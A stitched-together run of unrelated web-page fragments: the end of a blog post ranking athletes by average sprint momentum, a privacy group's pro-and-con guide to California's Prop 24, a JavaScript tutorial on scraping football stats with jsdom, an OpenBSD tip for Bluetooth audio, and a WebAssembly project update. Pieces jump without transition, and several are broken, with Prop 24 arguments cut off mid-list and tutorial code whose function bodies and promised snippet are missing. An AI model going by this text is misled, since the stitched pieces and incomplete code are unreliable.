    <td>Usain Bolt</td>
    <td>94</td>
    <td><b>09.63</b></td>
    <td>975.72</td>
  </tr>
  <tr>
    <td>Yohan Blake</td>
    <td>76</td>
    <td>09.75</td>
    <td>779.76</td>
  </tr>
  <tr>
    <td>Justin Gatlin</td>
    <td>83</td>
    <td>09.79</td>
    <td>847.43</td>
  </tr>
  <tr>
    <td>Tyson Gay</td>
    <td>77</td>
    <td>09.80</td>
    <td>785.40</td>
  </tr>
  <tr>
    <td>Ryan Bailey</td>
    <td><b>98</b></td>
    <td>09.88</td>
    <td><b>991.76</b></td>
  </tr>
  <tr>
    <td>Churandy Martina</td>
    <td>74</td>
    <td>09.94</td>
    <td>744.44</td>
  </tr>
  <tr>
    <td>Richard Thompson</td>
    <td>80</td>
    <td>09.98</td>
    <td>800.80</td>
  </tr>
  <tr>
    <td>Asafa Powell (inj)</td>
    <td>87</td>
    <td>12.00</td>
    <td>725.58</td>
  </tr>
</tbody></table>

<p>
We see that Ryan Bailey comes out on top as the most unstoppable!
</p>


<h2>Can We Do Better?</h2>
<p>
That's great and all, and we're very proud of Ryan, but perhaps Olympic sprinters aren't the best at this.
The 2012 sprint had a big weight range (24&nbsp;kg) and a big weight difference between first and second place (with Usain Bolt carrying 18&nbsp;kg more than Yohan Blake) so it seems that weight isn't that much of a determining factor for speed.
</p>

<p>
With these people being <em>literally</em> the fastest humans on the planet, the only way to beat them will be by finding someone heavier.
</p>

<p>
As Bailey was so close to 1000&nbsp;N&nbsp;s, that seems like a good milestone to aim for.
So we're looking for big people who can run fast. Rugby and American football seem like obvious places to start looking.
</p>

<p>
There were several promising rugby players, but they were quickly eclipsed by the American footballers I found, likely due to the more specialised nature of American football.
</p>

<h3>Brandon Jacobs</h3>
<!-- ... ~ 1.2?
120 kg
10.82 s
9.2421 m/s
-> 1109 -->
First up is Brandon Jacobs, a former American football running back, who spent the majority of his career with the New York Giants.


<table id="brandon-jacobs">
  <tbody><tr>
    <th>Athlete</th>
    <th>Weight (kg)</th>
    <th>Time (s)</th>
    <th>Avg Momentum (N s)</th>
  </tr>
  
  <tr>
    <td>Brandon Jacobs</td>
    <td>120</td>
    <td>10.82</td>
    <td>1109</td>
  </tr>
</tbody></table>

<p>
He blows our benchmark out of the water with a very impressive 1109 N&nbsp;s, and was the top spot in my mind for a good few years.
That is until my good friend John suggested:
</p>
<!-- Revisit
40yds in 4.56 s
120*(36.576/4.56) = 963

Explain calculations

spectator sport ... -->

<h3>Dontari Poe</h3><!--  ~ 1152.38
157 kg
40yd - 4.98 s
157*(36.576/4.98) = 1153
[no 100m info]
 -->
<p><em>“Can you believe he ran the 40-yard dash in 4.98 seconds? Poe looks like a refrigerator. He’s not supposed to move like that.”</em></p>
<p>
~ Warren Sapp, former defensive tackle and hall of famer
</p>

<p>
Adding a whole new level to the age-old question “Is your refrigerator running?” Poe is another freakish American football player, this time a nose tackle for the Dallas Cowboys.
</p>

<p>
There does not seem to be any 100&nbsp;m data for Poe, so I just used his 40 yard dash time.
This doesn't seem like it will affect our results too much, as Brandon Jacobs' 40 yard dash momentum was worse than his 100&nbsp;m, so if anything we could be underestimating Poe.
</p>

<table id="poe">
  <tbody><tr>
    <th>Athlete</th>
    <th>Weight (kg)</th>
    <th>Time (s)</th>
    <th>Avg Momentum (N s)</th>
  </tr>
  
  <tr>
    <td>Dontari Poe</td>
    <td>157</td>
    <td>4.98</td>
    <td>1153</td>
  </tr>
</tbody></table>

<p>
We have a new champion! It's no surprise this scarily large and scarily fast man is the winner here, but is there anyone out there who could beat him?
</p>


<h3>Hafþór Júlíus Björnsson, a.k.a. The Mountain</h3>
<p>
If you know this Icelandic man of many talents it is likely for his role in Game of Thrones, his strongman career, or both.
At over two metres in height (6 ft 9 in), and weighing in at 205 kg at his peak, this man is truly larger than life and has the commensurate accolades—including breaking the world deadlift record this year when he lifted 501 kg.
</p>

<p>
A lesser known fact is that he used to play basketball professionally, so he is probably still able to run in some capacity.
Perhaps unsurprisingly, the closest thing I could find to any sprint data for Hafþór was him running with a car on his back, but we're interested in the groundspeed velocity of an <em>unladen</em> fellow.
</p>

<p>
Using his most recent weight of 188 kg, we can rearrange the equation from earlier to find out how fast he would have to run a 100 m sprint to knock Dontari Poe off the top spot as the world's most unstoppable person.

$$\frac{100 \text{ m} \times 188 \text{ kg}}{1153 \text{ N s}}= 16.3 \text{ s}$$

But if he were to bulk up a bit more and get back to 205 kg, he would only need to run it in under 17.8 seconds.
</p>

<table id="thor">
    <tbody><tr>
      <th>Athlete</th>
      <th>Weight (kg)</th>
      <th>Time (s)</th>
      <th>Avg Momentum (N s)</th>
    </tr>
    
    <tr>
      <td>Hafþór Júlíus Björnsson</td>
      <td>188</td>
      <td>&lt;&nbsp;16.3?</td>
      <td>&gt;&nbsp;1153?</td>
    </tr>
  </tbody></table>


<p>This seems quite doable—even if he does weigh a fifth of a tonne.</p>

<h2>Epilogue: The Future of the Sport</h2>
<p>
While not a great spectator sport at the moment, and with little hope of it becoming one, it can still be fun to imagine how this would play out were it to become an event.
</p>

<p>
Of course contestants would be weighed right before the event for maximum accuracy.
Everyone might start running on a full stomach, wearing <em>even more</em> chains, or most likely weight vests.
Coaches would measure sprint times versus added weight and optimise to get the best momentum (I would be quite interested to see these graphs even today. Some militaries have likely already researched something along these lines).
The distribution of this added weight would also be quite important, and so to avoid awkwardness and bulkiness people would probably opt for platinum (iridium and osmium are slightly denser, but iridium is more expensive and osmium is more dangerous, rarer and harder to work with).
The sport might bifurcate into max and average camps, and perhaps different distances too like most other events (though presumably fewer in this instance).
</p>

<p>
In the end though, heavier folk will probably fare the best.
It's much better if the extra weight is actually doing something, so muscle wins over dead weight.
And there is no way Churandy Martina is running anywhere near a comparable time with an extra 20 kg—no matter how it's distributed.
</p>

<h3>Calculator</h3>
<p>
Calculate your own momentum and see how unstoppable you are!
</p>
<table id="you">
    <tbody><tr>
      <!-- <th>Athlete</th> -->
      <th>Weight (kg)</th>
      <th>Time (s)</th>
      <th>Avg Momentum (N s)</th>
    </tr>
    
    <tr>
      <!-- <td>You</td> -->
      <td></td>
      <td></td>
      <td id="result"></td>
    </tr>
  </tbody></table>

    <p>
      Proposition 24 is a 52-page law that overhauls privacy laws in California. It's so complex that it has split the privacy community, and experts disagree about what it would mean for Californians. Most voices agree Prop 24 has some changes to love, and some to reject. The typical voter is probably very uncertain about whether to vote "Yes" or "No".
    </p>
    <p>
      We are <strong>San Diego Privacy</strong>, a small group of privacy advocates in San Diego, and we'd like to help by offering a neutral analysis. Below you'll find 10 of the biggest issues with Prop 24, along with the main points supporters (the "Yes" side) and opponents (the "No" side) make about that issue.
    </p>
    <p>We suggest you first pick the issues in purple that jump out to you the most. Then, keep count of whether you find the Yes side or the No side more compelling, for the issues you've picked. Last, total up your counts.</p>
    <p>Then, as always, go vote your values.</p>

    <p><strong><i>Update</i></strong>: When you pick the issues below that matter to you, consider <a href="https://drive.google.com/drive/folders/1FSWtcqBEbe-SOUUWZ9d7j_M3Ft1ap5CR?usp=sharing" target="_blank">downloading a shareable image</a> of that issue as well, and posting it on social media to generate discussion.</p>

            <div>
              <p>
                <strong>Pay for Privacy</strong> means that if you demand privacy, companies can charge you more for goods and services.
              </p>
              <ul>
                <li>Companies that rely on targeted advertising, like newspapers or free streaming music services, currently rely on targeted ads.</li>
                <li>Some privacy options allow you to block the ability to show you targeted ads.</li>
                <li>Pay-for-privacy is already allowed in existing California law.</li>

                </p>
                <p>
                   When interviewed, Prop 24 author Alastair Mactaggart warns the newspaper industry would be hit hard if pay-for-privacy options were blocked. (<a href="https://youtu.be/eWOFZOPJm78?t=2186" target="_blank">Union-Tribune video interview</a> with Yes on 24)

        Authors' Note: It's important to emphasize here that pay-for-privacy is already allowed in current law. Opponents see Prop 24's choice to further expand pay-for-privacy, rather than ban it, as one reason to oppose it.

            <p>I feel strongly about <strong>Global Opt-Out</strong></p>
            <div>
              <p>
                <strong>Global Opt-Out</strong> allows you to set up your privacy options in one place, and have them apply universally. Prop 24 allows companies to ignore those global settings, in some cases.

              </p>
              <ul>
                <li>In the future, you'll be able to set your privacy preferences in one place, rather than at each site or service.</li>
                <li>Prop 24 includes provisions for allowing companies to ignore your global privacy preferences for certain reasons, like if they want you to pay.</li>
                <li>There could be other reasons companies won't have to respect your global privacy preferences.</li>

        Authors' Note: This is a good place to note that many privacy advocates believe all efforts to collect your data should require affirmative consent from you, rather than using the "opt-out" model where companies collect your data first, and then require you to ask it be deleted or not collected.

                Current privacy laws in California are rarely <strong>enforced.</strong> Only the California Attorney General can enforce California's privacy laws.

        Authors' Note: Privacy advocates feel very strongly that Californians should have the "private right of action," or the right to sue companies to enforce privacy law. It seems to us unlikely that privacy organizations will support overhauls to California's privacy laws without that private right of action being included.

The toolkit is pretty standard for these posts: python 3 (hopefully not second) as an engine, requests library for fetching, and Beautiful Soup 4 (which is 6 years old) for web parsing.</p>
<p><em>I’ve also seen few articles where they teach you how to parse HTML content with regular expressions, spoiler: <a href="https://stackoverflow.com/a/1732454/7668392">don’t do this</a>.</em>

<p>The problem is that I’ve seen articles like this 5 years ago and this stack hasn’t mostly changed. And more importantly, the solution is not native to javascript developers. If you would like to use technologies you are more familiar with, like ES2020, node, and browser APIs you will miss the direct guidance.</p>
<p>I’ve tried to fill the spot and create ‘the missing doc’.</p>
<h2>Overview</h2>
<blockquote>
<h4>Check if data is available in request</h4>
<p>Before you will start to do any of the programming, always check for the easiest available way. In our case, it would be a direct network request for data.</p>
<p>Open developer tools - F12 in most browsers - then switch to the <code>Network</code> tab and reload the page</p>
<p>If data is not baked in the HTML like it is in half of the modern web applications, there is a good chance that you don’t need to scrape and parse at all.

<p>If you are not so lucky and still need to do the scraping, here is the general overview of the process:</p>
<ol>
<li>fetch the page with the required data</li>
<li>extract the data from the page markup to some in-language structure (Object, Array, Set)</li>
<li>process the data: filter it, transform it to your needs, prepare it for the future usage</li>
<li>save the data: write it to the database or dump it to the filesystem</li>
</ol>
<p>That would be the easiest case for parsing, in sophisticated ones you can bump into some pagination, link navigation, dealing with bot protection (captcha), and even real-time site interaction. But all this wouldn’t be covered in the current guide, sorry.</p>
<h2>Fetching</h2>
<p>As an example of this guide, we will scrape a goal data for Messi from Transfermarkt. You can check his stats <a href="https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1">on the site</a>. To load the page from the node environment you will need to use your favorite request library. You can also use the raw HTTP/S module, but it doesn’t even support async, so I’ve picked <a href="https://github.com/node-fetch/node-fetch"><code>node-fetch</code></a> for this task. Your code will look something like:</p>
<div data-language="js"><pre><code><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>'node-fetch'</span><span>)</span>

<span>const</span> <span>DATA_URL</span> <span>=</span>
  <span>'https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1'</span>
<span>const</span> <span>loadMessiGoals</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>DATA_URL</span><span>)</span>
  <span>return</span> response<span>.</span><span>text</span><span>(</span><span>)</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>loadMessiGoals<span>}</span></code></pre></div>
<h2>Tools for parsing</h2>
<p>There are two major alternatives for this task which are conveniently represented with two high-quality most-starred and alive libraries.</p>

    <figcaption>We will use one of them</figcaption>
  </figure>
<p>The first approach is just to build a syntax tree from a markup text and then navigate it with familiar browser-like syntax. This one is fully covered with <a href="https://github.com/cheeriojs/cheerio">cheerio</a> that declared as <code>jQuery for server</code> (IMO, they need to revise their marketing vibes for 2020).</p>
<p>The second way is to build the whole browser DOM but without a browser itself. We can do this with wonderful <a href="https://github.com/jsdom/jsdom">jsdom</a> which is <code>node.js implementation of many web standards</code>.</p>
<p>Let’s take a closer look at both of them.</p>
<h3>cheerio</h3>
<p>Despite these analogies cheerio doesn’t have jQuery in dependencies, it just tries to reimplement most known methods from scratch:</p>
<div data-language="json"><pre><code> <span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"@types/node"</span><span>:</span> <span>"^14.11.2"</span><span>,</span>
  <span>"css-select"</span><span>:</span> <span>"~3.1.0"</span><span>,</span>
  <span>"dom-serializer"</span><span>:</span> <span>"~1.1.0"</span><span>,</span>
  <span>"entities"</span><span>:</span> <span>"~2.1.0"</span><span>,</span>
  <span>"htmlparser2"</span><span>:</span> <span>"^5.0.0"</span><span>,</span>
  <span>"lodash"</span><span>:</span> <span>"^4.17.20"</span><span>,</span>
  <span>"parse5"</span><span>:</span> <span>"^6.0.0"</span><span>,</span>
  <span>"parse5-htmlparser2-tree-adapter"</span><span>:</span> <span>"^6.0.0"</span>
<span>}</span></code></pre></div>
<p>Basic usage is really easy:</p>
<ul>
<li>
<p>you load a HTML</p>
<div data-language="js"><pre><code><span>const</span> $ <span>=</span> cheerio<span>.</span><span>load</span><span>(</span><span>'&lt;ul id="steps"&gt;...&lt;/ul&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>done, you’re great, now you can use JQ selectors/methods</p>

</li>
</ul>
<p>Probably you can pick this one if you need to save on size (cheerio is lightweight and fast) or you are really familiar with jQuery syntax and for some reason want to bring it to your new project. Cheerio is a nice way to do any kind of work with HTML you need in your application.</p>
<h3>jsdom</h3>
<p>This one is a bit more complicated: it tries to emulate part of the whole browser that is working with HTML and JS (apart from rendering the result). It’s used heavily for testing and … well scraping.</p>
<p>Let’s spin up jsdom:</p>
<ul>
<li>
<p>you need to use a constructor with your HTML</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span><span>'&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>then you can access standard browser API</p>
<div data-language="js"><pre><code>dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelector</span><span>(</span><span>"p"</span><span>)</span><span>.</span>textContent</code></pre></div>
</li>
</ul>
<p>jsdom is a lot heavier and it does a lot more job. You should understand, why to choose it over other options.</p>
<h2>Parsing</h2>
<p>In our example, I want to stick to the jsdom. It will help us to show one last approach at the end of the article. The parsing part is really vital but very short.</p>
<p>So we’ll start with building a dom from the fetched HTML:</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span>goalsHTML<span>)</span></code></pre></div>
<p>Then you can select table content with css selector and browser API. Don’t forget to create a real array from <code>NodeList</code> that <code>querySelectorAll</code> returns.</p>
<div data-language="js"><pre><code><span>const</span> rows <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table tbody tr'</span><span>)</span>
<span>)</span></code></pre></div>
<p>Now you have a two-dimensional array to work with. This part is finished, now you need to process this data to get clean and ready-to-work-with stats.</p>
<h2>Processing</h2>
<p>First, let’s check the lengths of our rows. Each row is the stat about goal and we mostly don’t care how many do we have. But each row can contain numbers in a different format so we have to deal with them.</p>
<p>We map over rows and get the length. Then we deduplicate results to see what options do we have here.</p>
<div data-language="js"><pre><code><span>const</span> lengths <span>=</span> rows<span>.</span><span>map</span><span>(</span><span>row</span> <span>=&gt;</span> row<span>.</span>length<span>)</span>
<span>const</span> result <span>=</span> <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span>lengths<span>)</span><span>]</span>
</code></pre></div>
<p>Not that bad, only 4 different shapes: with 1, 5, 14, and 15 cells.

    </span>
    <figcaption>All the possible row cases</figcaption>
  </figure>
<p>Since we don’t need rank data from extra cell in 15-cells case it is safe to delete it.</p>
<div data-language="js"><pre><code><span>const</span> <span>omitRank</span> <span>=</span> <span>(</span><span>row</span><span>)</span> <span>=&gt;</span>
  row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row</code></pre></div>
<p>Row with only one cell is actually useless: it is just a name of the season, so we will skip it.</p>
<div data-language="js"><pre><code><span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> <span>null</span></code></pre></div>
<p>For the 5-cells case (when player scored few goals in one match) we need to find previous full row and use it’s data for empty stats.</p>
<div data-language="js"><pre><code><span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
  goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals<span>)</span>

<span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals<span>)</span>
<span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span></code></pre></div>
<p>Now we just have to manually map data to keys, nothing scientific here and no smart way to avoid it.</p>
<div data-language="js"><pre><code><span>return</span> <span>{</span>
  competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
  matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>

<span>}</span></code></pre></div>
<h2>Saving</h2>
<p>We would just dump our result to a file, converting it to a string first with the <code>JSON.stringify</code> method.</p>
<div data-language="js"><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><span>.</span>promises

<span>const</span> <span>saveStats</span> <span>=</span> <span>async</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span></code></pre></div>

<h2>Bonus: One-time parsing with a snippet</h2>
</blockquote>
<p>Since we used <code>jsdom</code> with the browser-compatible API we actually don’t need any node environment to parse the data. If we just need it once from a particular page we can just run some code at the <code>Console</code> tab in the developers tools of your browser. Try to open <a href="https://www.transfermarkt.com/cristiano-ronaldo/alletore/spieler/8198/plus/1">any player stats on Transfermarkt</a> and paste this giant non-readable snippet to the console:</p>

<p>And now just apply this magic <code>copy</code> function that is integrated into the browser devtools. It would copy data to your clipboard.</p>

<p>Not that hard, right? And no need to deal with <code>pip</code> anymore. I hope you found this article useful. Stay tuned, next time we will visualize this scraped data with modern JS libs.</p>

					<p>I have a pair of <strong>Sony WH-1000XM3</strong> headphones and use them literally every day, most of my waking hours. I'm really addicted to music and my day would be ruined without it. I use Bluetooth to connect them to my phone and the 3.5mm cable when using them on my laptop. A few weeks ago, I forgot the cable at home and had to use the phone all day, since there is <a href="https://marc.info/?l=openbsd-cvs&amp;m=140511572108715&amp;w=2" title="It's not the years, honey; it's the mileage.">no support for Bluetooth in OpenBSD</a>.</p>

					<p>This was really frustrating and I went on ranting about it in <a href="ircs://irc.freenode.net:6697/openbsd" title="#openbsd on Freenode">#openbsd</a>. <a href="https://dataswamp.org/~solene/" title="Solene's percent %">Solène Rapenne</a> told me about an <a href="https://twitter.com/jcs/status/1111806329717432325" title="A tweet by joshua stein.">interesting tweet</a> from <a href="https://jcs.org/" title="joshua stein">jcs@</a>, where he mentions the <a href="https://uk.creative.com/p/sound-blaster/creative-bluetooth-audio-bt-w2-usb-transceiver" title="Creative Bluetooth Audio Transceiver">Creative BT-W2</a>.</p>

					<p>This little device works out of the box and handles the Bluetooth part while presenting OpenBSD with an audio device over USB. However, you will need to configure <a href="https://man.openbsd.org/sndiod.8" title="The manual for sndiod, the audio/MIDI server.">sndiod(8)</a> to send the audio to the <em>rsnd/1</em> device, like this:</p>

					<pre>$ doas rcctl set sndiod flags -f rsnd/1
$ doas rcctl restart sndiod
sndiod(ok)
sndiod(ok)
$ </pre>

					<p>I'm not sure why, but you can't control the volume using the <a href="https://man.openbsd.org/mixerctl.1">mixerctl(1)</a> utility. Instead, you will have to install the <strong>aucatctl</strong> package.

					</p><pre>$ doas pkg_add aucatctl
$ aucatctl master=80</pre>

					<p>I've used this little beauty for the last couple of weeks now and I love it! I can finally enjoy wireless audio like everyone else, but without the security mess that comes with Bluetooth.</p>

    <p>We announced the Bytecode Alliance nearly a year ago, and since then it has been… quite a year 😬</p>

<p>While the 2020-ness of this year has slowed us down on some fronts, we’ve also made a lot of progress on others.</p>

<p>Now that we’ve adjusted to the new normal, we’re gearing up to accelerate on <em>all</em> fronts. But before we do that, we wanted to share some highlights of what we’ve achieved to date.</p>

<h2 id="progress-on-the-nanoprocess-model">Progress on the nanoprocess model</h2>

<p>Our goal is to evolve WebAssembly from a compilation target that you compile monolithic applications <em>to</em>, to a modular ecosystem that you compose applications <em>from</em>.</p>

<p>As we do this, we have a chance to fix many longstanding problems with the way software is developed. For example, we can make it much safer for your application to use dependencies that you didn’t code yourself.</p>

<p>This is why the <a href="https://hacks.mozilla.org/2019/11/announcing-the-bytecode-alliance/">nanoprocess model</a> is so important. It’s the paradigm shift necessary to empower developers to defend themselves against these problems.</p>

<p>There are three core pieces of the nanoprocess model that are still in progress:</p>
<ul>
  <li>WASI, the WebAssembly System Interface</li>
  <li>Module linking</li>
  <li>Interface types</li>
</ul>

<p>You can think of WASI as the way that the host and a WebAssembly module talk to each other.</p>

<p>You can think of module linking as the way that two WebAssembly modules talk to each other.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-wasi-module-linking.png" alt="On the left, a WebAssembly module and host talking to each other using WASI. On the right, two WebAssembly modules talking to each other using module linking."></p>

<p>In both of these cases, the two sides are often written in different source languages. This means they might represent values and handles to resources in different ways. Basically, they speak foreign languages.</p>

<p>Interface types are like a foreign-language dictionary that the engine uses to help them communicate.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/nanoprocess-interface-types.png" alt="On both sides, the engine helps the two talk to each other using interface types."></p>

<p>Let’s see where the work on these stands today.</p>

<p><em>Note: The Bytecode Alliance doesn’t host specifications. While BA members are driving specs mentioned below, they are doing that in collaboration with others in the W3C WebAssembly CG. Bytecode Alliance projects include implementations of these specs.</em></p>

<h3 id="wasi-the-webassembly-system-interface">WASI, the WebAssembly System Interface</h3>

<p>When we introduced WASI, we compared it to <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> and other system interfaces. That was a bit of an oversimplification, though.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasi-low-level.png" alt="A file directory structure on the left, with a protective barrier in the middle containing the operating system kernel, and an application knocking for access on the right"></p>

<p>While WASI does aim to provide a set of standardized modules that provide these low-level system interface operations, we also intend to standardize modules for specialized higher-level host APIs.</p>

<p>We’ve made progress on both of these fronts.</p>

<h4 id="low-level-system-interface-level">Low-level system interface level</h4>
<p>For the low-level system interface level, the work has been focused on quality of implementation.</p>

<p>On the spec side, that has been identifying and addressing problems with cross-platform implementability of the spec. One example of this is the <a href="https://github.com/WebAssembly/WASI/pull/312"><code>wasi-socket</code></a> API (which was <a href="https://radu-matei.com/blog/towards-sockets-networking-wasi/">recently prototyped in Wasmtime</a>). In this case, the conversation has centered on the right way to apply capabilities-based security to the handling of sockets.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/portability.png" alt="A .wasm file running across three different operating systems"></p>

<p>On the implementation side, we’ve done a lot of work to improve the security and reliability of our implementation. Part of this has been developing robust fuzzing measures (which we describe more below).</p>

<p>Another thing we’ve done is factored out the security-critical operations into a dedicated library, <a href="https://github.com/bytecodealliance/cap-std"><code>cap-std</code></a>. It’s a cross-platform library which provides much of the functionality of Rust’s standard library in a capabilities-oriented way. This allows us to fully focus on getting those security-critical foundations right on all platforms. As a next step, we’ll make use of <code>cap-std</code> in our WASI implementation.</p>

<h4 id="specialized-higher-level-host-apis">Specialized higher-level host APIs</h4>
<p>For the specialized higher-level host APIs, there has been exciting work on proposals for completely new API modules.</p>

<p>One great example of this is <a href="https://github.com/WebAssembly/wasi-nn"><code>wasi-nn</code></a>, which is a <a href="https://www.youtube.com/watch?v=6O44X76rgIg">standardized interface for neural networking</a>. This is useful because trained machine learning models are typically deployed on a variety of different devices with different architectures and operating systems. Using <code>wasi-nn</code>, the <code>.wasm</code> file can do things like describe tensors and execute inference requests in a portable way, regardless of the underlying ISA and OS.</p>

<p>We’re implementing all of these in Wasmtime as they develop. That way, people can try them out and real world usage can inform the specification.</p>

<h3 id="module-linking">Module linking</h3>

<p>If we’re going to have an ecosystem of reusable code, we need a good way to link modules together.</p>

<p>Right now, you can link modules together using host APIs. For example, on the web you can string together a bunch of <code>WebAssembly.instantiate</code> calls to link a set of modules together. In Wasmtime, you use the <a href="https://bytecodealliance.github.io/wasmtime/examples-c-linking.html">linker APIs</a>.</p>

<p>But there are a few downsides to this imperative style, including the fact that it’s fairly cumbersome, not that fast and requires the host to include some type of garbage or cycle collector.</p>

<p>With the module linking proposal, linking becomes declarative. This means that it’s much easier to use. It also means that even at compile time, the engine has all of the information about how modules are connected to each other. This opens up lots of potential optimizations and features and removes the possibility of cycles.</p>

<p>For now, we’re focusing on load-time linking, which will enable modules to factor out common library code. And for that, the proposal is pretty much complete. Longer term, we’ll be able to add run-time dynamic linking as well.</p>

<p>Our next step is to finish a prototype implementation, which should be complete within the next few months.</p>

<h3 id="interface-types">Interface types</h3>

<p>The <a href="https://github.com/WebAssembly/interface-types">Interface Types proposal</a> is evolving nicely.</p>

<p>Interface Types can now talk about a rich set of values. The design is also more efficient now, removing the need for an intermediate copy of values in almost all cases.</p>

<p>So what’s left to do in the short term?</p>

<p>While Interface Types can talk about values, they can’t yet talk about <a href="https://github.com/WebAssembly/interface-types/issues/87">handles to resources</a> and <a href="https://github.com/WebAssembly/interface-types/issues/68">buffers</a>. Both are important to support WASI and other APIs, because things like files should use handles, and it should be possible to read a file and write directly into a buffer.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/interface-types.png" alt="On the left, types that are done, including strings, numbers, references, booleans, enums, objects, and unions. On the right, types left to be done: handles and buffers."></p>

<p>Once those features are in place, Interface Types will have everything it needs to support both WASI and Module Linking, making it possible for them to talk about values and resources in a source-language independent way. So we’ll continue working on the spec in the W3C.</p>

<p>On the implementation, we’ve set the stage to execute quickly. We’ve already implemented the new features in Wasm core which Interface Types depend on, such as <a href="https://bytecodealliance.org/articles/bytecodealliance.org/articles/reference-types-in-wasmtime">Reference Types</a>, <a href="https://bytecodealliance.org/articles/multi-value-all-the-wasm">multi-value</a>, and <a href="https://github.com/bytecodealliance/wasmtime/pull/2263">multi-memory support</a>.</p>

<p>We’re also working on tools for using Interface Types. Currently, people can use <a href="https://github.com/rustwasm/wasm-bindgen"><code>wasm-bindgen</code></a> to create bindings for JS code. In the coming year, we’ll add direct support for Interface Types to language toolchains, <a href="https://github.com/bytecodealliance/wasm-interface-types">starting with Rust</a>.</p>

<p>We expect to complete most of this work within the next six months.</p>

<p>In the meantime, for people wanting to get things done today but in a forward compatible way, you can define your interface using <a href="https://github.com/WebAssembly/WASI/blob/master/docs/witx.md">WITX</a>. You can learn more about how to do this from <a href="https://www.youtube.com/watch?v=LCA9NnH7DxE">this presentation</a> by Pat Hickey, or <a href="https://radu-matei.com/blog/wasm-api-witx/">this blog post</a> from Radu Matei.</p>

<h2 id="supporting-more-languages">Supporting more languages</h2>

<p>To bring the nanoprocess model to as many people as possible, we need to integrate with as many languages as possible.</p>

<h3 id="more-languages-compiling-into-the-webassembly-nanoprocess-model">More languages compiling into the WebAssembly nanoprocess model</h3>

<p>If you want to produce code that uses the nanoprocess model, you need a compiler that:</p>
<ol>
  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

